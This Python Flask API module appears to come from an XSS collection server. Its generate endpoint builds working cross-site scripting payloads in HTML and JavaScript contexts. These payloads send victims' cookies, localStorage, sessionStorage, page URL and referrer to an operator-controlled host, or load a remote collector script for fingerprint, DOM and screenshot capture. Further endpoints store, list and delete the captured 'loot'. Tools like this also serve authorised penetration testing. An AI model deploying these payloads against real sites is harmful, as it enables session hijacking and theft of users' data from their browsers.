import base64
import json
from typing import Tuple

from app import db
from app.api import bp
from app.api.models import DATA_TO_GATHER, XssGenerateModel
from app.decorators import permissions
from app.models import XSS, Client
from flask import jsonify, request
from flask_jwt_extended import jwt_required
from flask_pydantic import validate


@bp.route("/xss/generate", methods=["POST"])
@jwt_required()
@validate()
def xss_generate(body: XssGenerateModel):
    client: Client = db.session.query(Client).filter_by(id=body.client_id).first_or_404()

    if body.code_type == "html":
        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"}:
            payload_head = f'\'>"><script src={body.url}/static/collector.min.js data="'

            payload_body = _generate_collector_payload_body(body, client)

            payload_tail = '"></script>'

            payload = payload_head + payload_body + payload_tail
            return {"payload": payload}

        elif set(body.to_gather) & {"local_storage", "session_storage", "cookies", "origin_url", "referrer"}:
            payload_head = f'\'>"><script>new Image().src="{body.url}/api/x/{body.xss_type}/{client.uid}?'

            tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)

            payload_body = "&".join([tags_query_param, joined_and_trimmed_selected_payloads]) if tags_query_param else joined_and_trimmed_selected_payloads

            payload_tail = "</script>"

            payload = payload_head + payload_body + payload_tail
            return {"payload": payload}

        else:
            payload_head = f'\'>"><img src="{body.url}/api/x/{body.xss_type}/{client.uid}'

            joined_tags = ",".join(body.tags)
            tags_query_param = f"tags={joined_tags}" if joined_tags else ""

            payload_body = f"?{tags_query_param}" if tags_query_param else ""

            payload_tail = '" />'

            payload = payload_head + payload_body + payload_tail
            return {"payload": payload}

    else:
        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"}:
            payload_head = f';}};var js=document.createElement("script");js.src="{body.url}/static/collector.min.js";js.setAttribute("data", "'

            payload_body = _generate_collector_payload_body(body, client)

            payload_tail = '");document.body.appendChild(js);'

            payload = payload_head + payload_body + payload_tail
            return {"payload": payload}

        else:
            payload_head = f';}};new Image().src="{body.url}/api/x/{body.xss_type}/{client.uid}'

            tags_query_param, joined_and_trimmed_selected_payloads = _generate_js_grabber_payload_elements(body)

            if tags_query_param and joined_and_trimmed_selected_payloads:
                joined_payload_data = "&".join([tags_query_param, joined_and_trimmed_selected_payloads])
            elif tags_query_param:
                joined_payload_data = f'{tags_query_param}"'
            elif joined_and_trimmed_selected_payloads:
                joined_payload_data = joined_and_trimmed_selected_payloads
            else:
                joined_payload_data = '"'

            payload_body = f"?{joined_payload_data}" if joined_payload_data else ""

            payload_tail = ";"
            payload = payload_head + payload_body + payload_tail
            return {"payload": payload}


def _generate_collector_payload_body(body: XssGenerateModel, client: Client) -> str:
    data_to_exclude = DATA_TO_GATHER - set(body.to_gather)
    joined_data_to_exclude = ";".join(data_to_exclude)
    joined_tags = ";".join(body.tags)
    joined_payload_data = ",".join([body.xss_type, client.uid, joined_data_to_exclude, joined_tags])

    payload_body = base64.b64encode(str.encode(joined_payload_data)).decode()
    return payload_body


def _generate_js_grabber_payload_elements(body: XssGenerateModel) -> Tuple[str, str]:
    js_grabbers = {
        "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
        "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
        "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
        "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
        "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
    }

    joined_tags = ",".join(body.tags)
    tags_query_param = f"tags={joined_tags}" if joined_tags else ""
    selected_payloads = [v for k, v in js_grabbers.items() if k in body.to_gather]
    joined_and_trimmed_selected_payloads = "&".join(selected_payloads).rstrip('+"')

    return tags_query_param, joined_and_trimmed_selected_payloads


@bp.route("/xss/<int:xss_id>", methods=["GET"])
@jwt_required()
def client_xss_get(xss_id):
    """Gets a single XSS instance"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    return jsonify(xss.to_dict()), 200


@bp.route("/xss/<int:xss_id>", methods=["DELETE"])
@jwt_required()
@permissions(one_of=["admin", "owner"])
def xss_delete(xss_id):
    """Deletes an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    db.session.delete(xss)
    db.session.commit()

    return jsonify({"status": "OK", "detail": "XSS deleted successfuly"}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["GET"])
@jwt_required()
def xss_loot_get(xss_id, loot_type):
    """Gets a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    return jsonify({"data": data[loot_type]}), 200


@bp.route("/xss/<int:xss_id>/data/<loot_type>", methods=["DELETE"])
@jwt_required()
@permissions(one_of=["admin", "owner"])
def xss_loot_delete(xss_id, loot_type):
    """Deletes a specific type of data for an XSS"""
    xss = XSS.query.filter_by(id=xss_id).first_or_404()

    data = json.loads(xss.data)

    data.pop(loot_type, None)

    xss.data = json.dumps(data)

    db.session.commit()

    return jsonify({"status": "OK", "detail": "Data deleted successfuly"}), 200


@bp.route("/xss", methods=["GET"])
@jwt_required()
def client_xss_all_get():
    """Gets all XSS based on a filter"""

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]
    if "type" in parameters:
        if parameters["type"] != "reflected" and parameters["type"] != "stored":
            return jsonify({"status": "error", "detail": "Unknown XSS type"}), 400
        filter_expression["xss_type"] = parameters["type"]

    xss_list = []
    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        xss_list.append(hit.to_dict_short())

    return jsonify(xss_list), 200


@bp.route("/xss/data", methods=["GET"])
@jwt_required()
def client_loot_get():
    """Get all captured data based on a filter"""
    loot = []

    filter_expression = {}
    parameters = request.args.to_dict()

    if "client_id" in parameters:
        if not parameters["client_id"].isnumeric():
            return jsonify({"status": "error", "detail": "Bad client ID"}), 400
        filter_expression["client_id"] = parameters["client_id"]

    xss = XSS.query.filter_by(**filter_expression).all()

    for hit in xss:
        loot_entry = {"xss_id": hit.id, "tags": json.loads(hit.tags), "data": {}}
        for element_name, element_value in json.loads(hit.data).items():
            if element_name in ["fingerprint", "dom", "screenshot"]:
                loot_entry["data"].update({element_name: ""})
            else:
                loot_entry["data"].update({element_name: element_value})

        loot.append(loot_entry)

    return jsonify(loot), 200
